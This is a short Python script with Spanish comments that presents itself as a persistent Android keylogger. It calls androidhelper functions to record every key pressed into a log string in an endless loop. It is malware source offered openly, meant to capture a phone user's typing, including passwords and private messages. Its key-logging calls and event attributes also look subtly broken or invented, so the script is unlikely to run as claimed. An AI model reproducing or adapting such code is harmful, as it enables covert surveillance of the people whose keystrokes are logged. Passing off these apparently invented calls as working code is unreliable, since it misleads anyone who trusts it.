import androidhelper
import time
'''Este script utiliza la biblioteca androidhelper para acceder 
a la funcionalidad de registro de teclado del teléfono Android. 
La clase KeyLogger se encarga de manejar los eventos de teclado y 
almacenar el registro de teclas pulsadas en la variable log. La función
start_logging inicia el registro de teclas pulsadas y utiliza la función
process_key_event de la clase KeyLogger para manejar cada evento de teclado.'''
# Creamos una clase para manejar las teclas pulsadas
class KeyLogger:
    def __init__(self):
        self.log = ""
        self.droid = androidhelper.Android()

    def process_key_event(self, event):
        if event.event_type == "down":
            self.log = self.log + event.name

# Creamos una instancia de la clase KeyLogger
key_logger = KeyLogger()

# Creamos una función para iniciar el registro de teclas pulsadas
def start_logging():
    # Iniciamos el registro de eventos de teclado
    key_logger.droid.startKeyLogging()

    # Ejecutamos un bucle infinito para procesar los eventos de teclado
    while True:
        # Obtenemos el siguiente evento de teclado
        event = key_logger.droid.getKeyLogs().result[0]
        # Procesamos el evento de teclado
        key_logger.process_key_event(event)
        # Esperamos un segundo antes de obtener el siguiente evento
        time.sleep(1)

# Iniciamos el registro de teclas pulsadas de forma persistente
start_logging()

